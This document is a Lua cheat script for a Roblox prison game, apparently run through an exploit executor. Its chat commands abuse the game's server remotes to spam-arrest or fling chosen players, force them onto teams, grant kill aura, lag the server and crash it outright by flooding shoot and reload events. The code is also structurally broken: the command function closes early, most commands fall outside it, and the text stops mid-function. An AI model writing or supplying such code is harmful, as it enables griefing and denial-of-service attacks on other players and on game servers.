local ExecutionTime = tick()
local Players = game:GetService("Players")
local Teams = game:GetService("Teams")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local RegionModule = require(ReplicatedStorage.Modules_client.RegionModule_client)
local TooltipModule = require(ReplicatedStorage.Modules_client.TooltipModule)

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local isMobile = UserInputService.TouchEnabled

local Settings = {
    Prefix = ".",
    ToggleGui = "RightControl"
}

local Commands = {
    "test / test", -- test command
}

local function GetPlayer(searchString, player)
    if not searchString or searchString:lower() == "me" then
        return player
    end

    local matchedPlayer
    local searchStringLower = searchString:lower()

    for _, v in ipairs(Players:GetPlayers()) do
        local success, result = pcall(function()
            local lowerName = v.Name:lower()
            local lowerDisplayName = v.DisplayName:lower()
            if lowerName:sub(1, #searchStringLower) == searchStringLower or lowerDisplayName:sub(1, #searchStringLower) == searchStringLower then
                matchedPlayer = v
            end
        end)
        if success and matchedPlayer then
            break
        end
    end

    return matchedPlayer
end

function UseCommand(MESSAGE)
    local Args = MESSAGE:split(" ")

    if not Args[1] then 
        return
    end

    if Args[1] == "/e" then
        table.remove(Args, 1)
    end

    if Args[1] == "/w" then
        table.remove(Args, 1)
        if Args[2] then
            table.remove(Args, 1)
        end
    end

    if Args[1]:sub(1, 1) ~= Settings.Prefix then
        return
    end

    local CommandName = Args[1]:sub(2)

    local function CMD(NAME)
        return NAME:lower() == CommandName:lower()
    end

    -- Commands
    if CMD("test") then
        -- Your command implementation here
        print("Success: Test command executed")
    end
end
   
    if CMD("autoitems") or CMD("autoi") or CMD("aitems") then
        States.AutoItems = true;
        States.GiveGuns = true;
        Notify("Success", "Enabled Autoitems.", 2);
        GiveAllItems()
    end;
    if CMD("unautoitems") or CMD("unautoi") or CMD("unaitems") then
        States.AutoItems = false
        States.GiveGuns = false
        myarguments.has_executedautoitems = false;
        Notify("Success", "Disabled autoitems.", 2);
    end;
    if CMD("givehandcuffs") or CMD("handcuffs") then
        Notify("Error", Args[2] .. " This command does not exist yet and is patched because you cant destroy humanoid!", 2);
    end;
    if CMD("givetaser") or CMD("taser") then
        Notify("Error", Args[2] .. " This command does not exist yet and is patched because you cant destroy humanoid!", 2);
    end;
    if CMD("placeholder_armor") then
        if CheckOwnedGamepass() then
            SavePos();
            local SavedTeam = LocalPlayer.TeamColor.Name
            if #Teams.Guards:GetChildren() > 8 then
                Loadchar("Bright blue");
            else
                TeamEvent("Bright blue");
            end;
            ItemHandler(workspace.Prison_ITEMS.clothes["Riot Police"].ITEMPICKUP);
            if SavedTeam == "Bright orange" or SavedTeam == "Medium stone grey" then
                TeamEvent("Bright orange");
            end;
            LoadPos();
            --Notify("Success", "Obtained riot armor.", 2);
            Notify("Error", Args[2] .. " This command does not exist yet!", 2);
        else
            Notify("Error", "You don't own the gamepass.", 2);
        end;
    end;
    if CMD("csa") or CMD("crashsa") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            local Halt = false;
            SavePos()
            task.spawn(Crim, Player, true)
            task.spawn(function()
                task.wait(5)
                Halt = true;
            end);
            repeat
                task.wait()
                if not Player or not Players:FindFirstChild(Player.Name) or Halt then
                    break
                end
            until Player.TeamColor.Name == "Really red"
            if not Halt then
                for i = 1, 10 do
                    task.spawn(function()
                        for i = 1, 100 do
                            task.spawn(function()
                                task.spawn(function()
                                    for i = 1, 100 do
                                        task.spawn(function()
                                            task.spawn(function()
                                                workspace.Remote.arrest:InvokeServer(Player.Character:FindFirstChildWhichIsA("Part"));
                                            end);
                                        end)
                                        if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                                            break
                                        end
                                    end;
                                end);
                            end);
                            if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                                break
                            end
                        end;
                    end)
                    task.spawn(function()
                        pcall(function()
                            LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                        end);
                    end)
                    if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                        break
                    end
                    task.wait()
                end;
                task.wait(0.1)
                LoadPos()
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("sa") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Notify("Success", "Spam arresting: " .. Player.Name, 5);
            States.SpamArresting = true;
            task.spawn(function()
                while true do
                    if not States.SpamArresting or not Player or not Players:FindFirstChild(Player.Name) then
                        break
                    end
                    task.spawn(ArrestEvent, Player, 35);
                    task.wait(0.03)
                end;
            end);
            task.spawn(function()
                while true do
                    if Player.TeamColor.Name ~= "Really red" and Player.TeamColor.Name ~= "Bright orange" then
                        pcall(function()
                            coroutine.wrap(firetouchinterest)(Player.Character.Head, game.Lighting:FindFirstChild("SpawnLocation"), 0)
                        end)
                    end;
                    rService.Heartbeat:wait()
                end;
            end);
            while true do
                if not States.SpamArresting or not Player or not Players:FindFirstChild(Player.Name) then
                    break
                end;
                if Player.TeamColor.Name ~= "Really red" then
                    if Player.TeamColor.Name == "Bright orange" then
                        if IllegalRegion(Player) then
                            pcall(function()
                                LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                            end);
                        else
                            Teleport(Player, CFrame.new(984, 100, 2268));
                        end;
                    else
                        Crim(Player, true);
                    end;
                else
                    pcall(function()
                        LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                    end);
                end;
                rService.Heartbeat:wait();
            end;
            task.spawn(function()
                while task.wait(0.03) do
                    for i,v in pairs(workspace:GetChildren()) do
                        if v.Name == "SpawnLocation" then
                            v.Parent = game.Lighting
                        end;
                    end;
                    if not workspace:FindFirstChild("SpawnLocation") then
                        break
                    end;
                end;
            end);
            Notify("Success", "Finished spam arrest", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("unsa") or CMD("breaksa") then
        States.SpamArresting = false;
        Notify("Success", "Now stopping spam arrest...", 2);
    end
    if CMD("arrest") or CMD("ar") then
        SavePos();
        local Player = GetPlayer(Args[2], LocalPlayer);
        local Times = tonumber(Args[3]);
        Times = Times or 1;
        if Player then
            Arrest(Player, Times);
            Notify("Success", "Arrested " .. Player.Name .. ".", 2);
        end;
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") then
                    if (v.TeamColor.Name == "Bright orange" and IllegalRegion(v)) or v.TeamColor.Name == "Really red" then
                        Arrest(v, Times);
                    end;
                end;
            end;
            Notify("Success", "Arrested everyone.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
        for i = 1, 10 do
            LoadPos();
            task.wait();
        end;
    end;
    if CMD("harrest") or CMD("har") then
        SavePos();
        myarguments.arrestposition2 = true
        local Player = GetPlayer(Args[2], LocalPlayer);
        local Times = tonumber(Args[3]);
        Times = Times or 1;
        if Player then
            Arrest(Player, Times);
            Notify("Success", "Arrested " .. Player.Name .. ".", 2);
        end;
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") then
                    if (v.TeamColor.Name == "Bright orange" and IllegalRegion(v)) or v.TeamColor.Name == "Really red" then
                        Arrest(v, Times);
                    end;
                end;
            end;
            Notify("Success", "Arrested everyone.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
        for i = 1, 10 do
            LoadPos();
            task.wait();
        end;
        myarguments.arrestposition2 = false
    end;
    if CMD("breakarrest") or CMD("ba") then
        myarguments.breakarrest = true
        Notify("Success", "Stopped arrest.", 2);
        task.wait(.1)
        myarguments.breakarrest = false
    end;
    if CMD("autoarrest") or CMD("autoar") then
        States.AutoArrest = true
        Notify("Success", "AutoArresting Players (unautoarrest to disable).", 2);
        myarguments.alreadyautoarrestingplayers = false
        if myarguments.alreadyautoarrestingplayers then
        Notify("Failed", "Already AutoArresting Players!", 2);
        else
        myarguments.alreadyautoarrestingplayers = true
        while States.AutoArrest do
            pcall(function()
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") and not v.Character.Head:FindFirstChildOfClass("BillboardGui") and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
                    if (v.TeamColor.Name == "Bright orange" and IllegalRegion(v)) or v.TeamColor.Name == "Really red" then
                        SavePos();
                        Arrest(v, 1);
                        LoadPos();
                    end;
                end;
            end;
            end)
        wait(.3)
        end
        end
    end;
    if CMD("unautoarrest") then
        States.AutoArrest = false
        myarguments.alreadyautoarrestingplayers = false
        myarguments.breakarrest = true
        Notify("Success", "Stopped AutoArrest.", 2);
    end;
    if CMD("speed") or CMD("walkspeed") then
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(Args[2])
        Notify("Success", "Changed walkspeed to " .. tonumber(Args[2]) .. ".");
    end;
    if CMD("autospeed") or CMD("aspeed") then
        AutoSpeed = true
        SavedSpeed = tonumber(Args[2])
        Notify("Success", "Automatic walkspeed to " .. tonumber(Args[2]) .. ".");
        while AutoSpeed do
            task.wait(0.1)
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = SavedSpeed
        end
    end;
    if CMD("unautospeed") or CMD("unaspeed") then
        AutoSpeed = false
        Notify("Success", "Stopped autospeed.");
    end;
    if CMD("hipheight") or CMD("height") or CMD("float") then
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = tonumber(Args[2])
       Notify("Success", "Changed hipheight to " .. tonumber(Args[2]) .. ".");
    end;
    if CMD("jumppower") or CMD("jump") then
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = tonumber(Args[2])
        Notify("Success", "Changed JumpPower to " .. tonumber(Args[2]) .. ".");
    end;
    if CMD("crim") or CMD("cr") or CMD("criminal") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        elseif Args[2] == "inmates" then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        elseif Args[2] == "guards" then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Crim(Player, false);
                Notify("Success", "Changed " .. Player.Name .. "'s team to Criminal.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("virus") or CMD("infect") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Infected[Player.UserId] = Player;
            Notify("Success", "Infected " .. Player.Name .. ".", 2);
        elseif Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                Infected[v.UserId] = v;
            end;
            Notify("Success", "Started a pandemic.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    Infected[v.UserId] = v;
                end;
            end);
            if Success then
                Notify("Success", "Infected everyone in the " .. Team .. " team.")
            else
                Notify("Error", Args[2] .. " is not a valid player / team.", 2);
            end;
        end;
    end;
    if CMD("unvirus") or CMD("rvirus") or CMD("cure") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Infected[Player.UserId] = nil;
            Notify("Success", "Cured " .. Player.Name .. ".", 2);
        elseif Args[2] == "all" then
            Infected = {};
            Notify("Success", "Cured everyone.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("ka") or CMD("killaura") or CMD("aura") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            KillAuras[Player.UserId] = Player;
            Notify("Success", "Gave " .. Player.Name .. " kill aura.", 2);
        elseif Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                KillAuras[v.UserId] = v;
            end;
            Notify("Success", "Gave everyone kill aura.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    KillAuras[v.UserId] = v;
                end;
            end);
            if Success then
                Notify("Success", "Gave the " .. Team .. " kill aura.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player / team.", 2);
            end;
        end;
    end;
    if CMD("unka") or CMD("unkillaura") or CMD("unaura") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            KillAuras[Player.UserId] = nil;
            Notify("Success", "Removed " .. Player.Name .. "'s kill aura.", 2);
        elseif Args[2] == "all" then
            KillAuras = {};
            Notify("Success", "Removed everyone's kill aura.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    KillAuras[v.UserId] = nil;
                end;
            end);
            if Success then
                Notify("Success", "Removed the " .. Team .. "'s kill aura.", 2);
            end;
        end;
    end;
    if CMD("clv") or CMD("clearvirus") then
        Infected = {};
        Notify("Success", "Cleared infected", 2);
    end;
    if CMD("yard") or CMD("yar") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(791, 98, 2498));
            Notify("Success", "Teleported " .. Player.Name .. " to yard.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("back") or CMD("bac") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(984, 100, 2318));
            Notify("Success", "Teleported " .. Player.Name .. " to back nexus.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("armory") or CMD("arm") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(837, 100, 2266));
            Notify("Success", "Teleported " .. Player.Name .. " to armory.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("tower") or CMD("tow") or CMD("twr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(823, 130, 2588));
            Notify("Success", "Teleported " .. Player.Name .. " to tower.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("base") or CMD("cbase") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-943, 94, 2056));
            Notify("Success", "Teleported " .. Player.Name .. " to base.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cafe") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(930, 100, 2289));
            Notify("Success", "Teleported " .. Player.Name .. " to cafe.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("kit") or CMD("kitchen") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(919, 100, 2230));
            Notify("Success", "Teleported " .. Player.Name .. " to kitchen.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cel") or CMD("cells") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(917, 100, 2444));
            Notify("Success", "Teleported " .. Player.Name .. " to prison cells area.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("anticrim") or CMD("ac") then
        States.AntiCriminal = not States.AntiCriminal;
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        Notify("Success", "Toggled anti-crim to " .. tostring(States.AntiCriminal) .. ".", 2);
    end;
    if CMD("af") or CMD("autofire") then
        if LocalPlayer.Character then
            local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool");
            if Tool then
                if Tool:FindFirstChild("GunStates") then
                    EditStat(Tool, "AutoFire", true);
                    Notify("Success", "Enabled autofire on: " .. Tool.Name .. ".", 2);
                else
                    Notify("Success", "You aren't holding a gun.", 2);
                end;
            else
                Notify("Error", "Unable to find gun (you must equip it).", 2);
            end;
        end;
    end;
    if CMD("ab") or CMD("antibring") then
        States.AntiBring = not States.AntiBring
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        Notify("Success", "Toggled anti-bring to " .. tostring(States.AntiBring) .. ".", 2);
    end;
    if CMD("nodoors") then
        local Success, Error = pcall(function()
            workspace:FindFirstChild("Doors").Parent = game.Lighting;
            workspace:FindFirstChild("Prison_Cellblock"):FindFirstChild("doors").Parent = game.Lighting;
        end)
        if Success then
            Notify("Success", "Removed doors.", 2);
        end;
    end;
    if CMD("doors") or CMD("redoors") then
        local Success, Error = pcall(function()
            game.Lighting:FindFirstChild("Doors").Parent = workspace;
            game.Lighting:FindFirstChild("doors").Parent = workspace;
        end)
        if Success then
            Notify("Success", "Restored doors.", 2);
        end;
    end;
    if CMD("aa") or CMD("arrestaura") then
        States.ArrestAura = not States.ArrestAura;
        Notify("Success", "Toggled arrest aura to " .. tostring(States.ArrestAura) .. ".", 2);
        if States.ArrestAura then
    while States.ArrestAura do task.wait() -- I moved it here to prevent having too much while true do loops and increase performance
        if States.ArrestAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") then
                    if LocalPlayer.Character and v.Character and v.TeamColor ~= BrickColor.new("Bright blue") and v.TeamColor ~= BrickColor.new("Medium stone grey") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                              if IllegalRegion(v) or v.TeamColor == BrickColor.new("Really red") then
                                ArrestEvent(v);
                              end
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
        end
    end;
    if CMD("antifling") or CMD("afling") then
        States.AntiFling = not States.AntiFling;
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        Notify("Success", "Toggled anti-fling to " .. tostring(States.AntiFling) .. ".", 2);
    end;
    if CMD("annoy") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player and not States.Annoy then
            Notify("Success", "Annoying " .. Player.Name .. ".", 2);
            coroutine.wrap(Annoy)(Player);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("unannoy") then
        States.Annoy = false;
        Notify("Success", "Stopped annoying.", 2);
    end;
    if CMD("def") or CMD("defenses") then
        Notify("Success", "Enabled all defenses.", 2);
        for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
            v:Disable();
        end;
        States.AntiBring = true;
        States.AntiFling = true;
        States.AntiCriminal = true;
        States.AntiPunch = true;
        States.AntiCrash = true;
        States.ShootBack = false;
        States.TaseBack = false;
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
        ChangeGuiToggle(false, "Shoot Back")
        ChangeGuiToggle(false, "Tase Back")
        if #Teams.Guards:GetPlayers() >= 8 then
            SavePos();
            Loadchar("Bright blue")
            LoadPos();
        else
            TeamEvent("Bright blue");
        end;
    end;
    if CMD("undef") or CMD("undefenses") then
        Notify("Success", "Disabled all defenses.", 2);
        for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
            v:Enable();
        end;
        States.AntiBring = false;
        States.AntiFling = false;
        States.AntiCriminal = false;
        States.AntiPunch = false;
        States.AntiCrash = false;
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
    end;
    if CMD("protect") or CMD("whitelist") or CMD("p") or CMD("wl") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Protected[Player.UserId] = Player;
            Notify("Success", "Protected " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("unprotect") or CMD("up") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Protected[Player.UserId] = nil;
            Notify("Success", "Removed " .. Player.Name .. "'s protection.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("clp") or CMD("clearprotected") then
        Protected = {};
        Notify("Success", "Cleared protected.", 2);
    end;
    if CMD("nowalls") then
        local Success, Error = pcall(function()
            for i,v in next, Walls do
                v.Parent = game.Lighting;
            end;
        end);
        if Success then
            Notify("Success", "Removed walls.", 2);
        end;
    end;
    if CMD("walls") then
        local Success, Error = pcall(function()
            for i,v in next, Walls do
                v.Parent = workspace;
            end;
        end);
        if Success then
            Notify("Success", "Restored walls.", 2);
        end;
    end;
    if CMD("fling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Fling(Player, false);
            Notify("Success", "Flung " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("sfling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Fling(Player, true);
            Notify("Success", "Super flung " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("lag") then
        local hasRemington870e = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
        if not hasRemington870e then
        task.spawn(function()
            Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("Remington 870") or workspace.Prison_ITEMS.single:FindFirstChild("Remington 870")})
        end)
        end
        if not States.LagServer then
            local Strength = tonumber(Args[2]) or 10;
            Notify("Success", "Lagging server with strength: " .. Args[2] .. ".", 2);
            coroutine.wrap(LagServer)(Strength);
        else
            Notify("Error", "You are already lagging the server - use unlag and try again.", 2);
        end;
    end;
    if CMD("unlag") then
        States.LagServer = false;
        Notify("Success", "Stopped lagging server.", 2);
    end;
    if CMD("rip_placeholder") or CMD("crash_placeholder") then
        local Events = {}
        task.wait(1/10);
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                for i = 1, 15 do
                    local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, v.Position;
                    local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
                    local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
                    Events[#Events+1] = {
                        Hit = workspace:FindFirstChildOfClass("Part"),
                        Cframe = cf,
                        Distance = distance,
                        RayObject = ray
                    }
                end
            end
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
                    end)
                    local Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47");
                    if Gun then
                        rStorage.ShootEvent:FireServer(Events, Gun);
                    end
                end;
            end;
        end);
    end;
    if CMD("crashserver") or CMD("servercrash") or CMD("svcrash") then
	if #game:GetService("Teams").Guards:GetPlayers() < 8 then
                SaveCameraPos()
                diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		workspace.Remote.TeamEvent:FireServer("Bright blue")
	else
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("M9") or workspace.Prison_ITEMS.single:FindFirstChild("M9")})
        end)
        end
    task.spawn(function()
        local Events = {}
        task.wait(1/10);
        for i = 1, 50 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("M9") or LocalPlayer.Character:FindFirstChild("M9");
                        if Gun then
                            task.spawn(function()
                            rStorage.ReloadEvent:FireServer(Gun);
                            end)
                            task.spawn(function()
                            rStorage.ShootEvent:FireServer(Events, Gun);
                            end)
                        end
                    end)
                end;
            end;
        end);
    end)
        Notify("Success", "Crashing server...", 2);
    end;               
    if CMD("scrash") or CMD("supercrash") then
        diedpos = char:WaitForChild("HumanoidRootPart").CFrame
        workspace.Remote.TeamEvent:FireServer("Bright blue")
        task.wait(.1)
        GiveGuns()
        task.wait(.1)
local function m9crashmethod()
        local Events = {}
        task.wait(1/10);
        for i = 1, 50 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP);
                    end);
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("M9") or LocalPlayer.Character:FindFirstChild("M9");
                        if Gun then
                            task.spawn(function()
                            rStorage.ReloadEvent:FireServer(Gun);
                            end)
                            task.spawn(function()
                            rStorage.ShootEvent:FireServer(Events, Gun);
                            end)
                        end
                    end)
                end;
            end;
        end);
end
spawn(m9crashmethod)
local function tasercrashmethod()
        local Events = {}
        task.wait(1/10);
        for i = 1, 10 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("Taser") or LocalPlayer.Character:FindFirstChild("Taser");
                        if Gun then
                            task.spawn(function()
                            rStorage.ReloadEvent:FireServer(Gun);
                            end)
                            task.spawn(function()
                            rStorage.ShootEvent:FireServer(Events, Gun);
                            end)
                        end
                    end)
                end;
            end;
        end);
end
if LocalPlayer.TeamColor == BrickColor.new("Bright blue") then spawn(tasercrashmethod) end
local function ak47crashmethod()
        local Events = {}
        task.wait(1/10);
        for i = 1, 100 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait(0.03) do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
                    end);
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47");
                        if Gun then
                            rStorage.ShootEvent:FireServer(Events, Gun);
                        end
                    end)
                end;
            end;
        end);
end
spawn(ak47crashmethod)
-- Remington crash method
coroutine.wrap(LagServer)(69);
    if LocalPlayer.Backpack:FindFirstChild("M4A1") then
local function m4a1crashmethod()
        local Events = {}
        task.wait(1/10);
        for i = 1, 100 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait(0.03) do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP);
                    end);
                    pcall(function()
